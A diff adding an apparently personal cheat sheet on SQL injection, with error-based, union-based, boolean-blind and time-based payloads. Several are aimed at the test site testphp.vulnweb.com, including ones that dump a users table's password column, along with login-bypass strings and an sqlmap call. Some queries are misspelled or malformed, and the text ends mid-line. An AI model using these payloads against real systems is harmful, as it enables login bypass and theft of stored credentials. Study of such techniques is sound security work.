@@ -1,0 +1,103 @@
+IMPACT OF SQL INJECTION:
+
+ Bypassing authendication
+ Stealing Data
+ Modifying or corrupted Data
+ Deleting Data
+ Running arbitrary code
+ Gaining root access to the system itself
+
+SQL injection:
+
+  Error based:(Inband -same communication channel-directly correcting error and connecting)
+  
+  check:error based use string with ' or " ------> if you got syntax error just goto check
+
+  breaking method example: select * from login where user=""; -- and password="";
+
+  if integer value use pyload "77;--pwn"		
+
+  in data base they use clumn name instant of *; --> you need to check how many colum it using 
+  
+
+  try this query ------------> select name from cricket where  age=22 order by 1;
+
+  Example:http://testphp.vulnweb.com/listproducts.php?cat=1%20order%20by%2011;--#dfdsfds;
+  
+see the reflection:
+
+
+ find the datatype:
+
+     Example query:select a,b,c from table1 union select 'a',null,null,
+     ---error -> column is not text type, change position
+     ---not error -> it is text type 
+ 
+ http://testphp.vulnweb.com/listproducts.php?cat=1%20order%20by%2011;--#dfdsfds;
+
+ select name from cricket union select 1; ----> if one reflected try ---->    select name from cricket union select database();
+ 
+  in oracle database: if u use union u must use 'dual' dummy datble for reflect data
+  example1:data" union database();--cmdline
+
+  example2:data" union select table name from select name from cricket union select database();
+
+  example3:data" union select table_name from information_schema.tables where table_schema=database();--for get table name
+
+  example4:select name from hackers where name="Berlin" union select column_name from information_schema.columns where table_schema=database() and table_name='hackers';--for get table column
+   
+  for Postgres database:
+
+   	SELECT table_name FROM information_schema.tables
+        SELECT counmn_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' 
+
+  try to find another table using union query;
+
+  Identifying table name:
+  
+  see tables:
+	
+  http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%201,table_name,3,4,5,6,7,8,9,10,11%20from%20information_schema.tables%20where%20table_schema=database();--#
+   
+  see table couumns:
+
+ http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%201,column_name,3,4,5,6,7,8,9,10,11%20from%20information_schema.columns%20where%20table_schema=database()%20and%20%20table_name=%27users%27;--#
+
+ i got  user table with pass coulumn so i use:
+
+ http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%201,pass,3,4,5,6,7,8,9,10,11%20from%20users;--#
+
+ SQLI LEAD TO LOGIN Bypassing:
+
+   select acc from hackers where name="Berlin"; --kjdkfjdk;
+        payload=data"; --dkfjdkf;
+        payload=data" or 1=1;--dkfdkj;
+  
+
+Blind Sql injection:
+
+  Boolean:
+     
+    using queries: substring,ascii
+
+   select substring("hellow world",2,5);
+
+    sample payload:data" select ascii((select substring((select table_name from information_schema.tables where table_schema=database()limit 1),2,3)))>113;
+
+   select * from hackers where name="Berlin" or "1"="1";
+
+   query for check table in the DB:select name from hackers where id=1 and (select 'x' from hackers limit 1)='x';
+
+  Time Based :
+
+    select id from hackers where name="Berlin" union select case when (1=1) then sleep(3) else null end;
+
+    select id from hackers where name="Johns" union select case when (length(acc)=7) then sleep(3) else null end from  hackers where Status="Pro";
+
+    
+God father Orwam methodology:
+
+  sqlma -u "url.com/1"
+  try in file upload(param): filename="pic.jpg""
+
+try error req to change to:
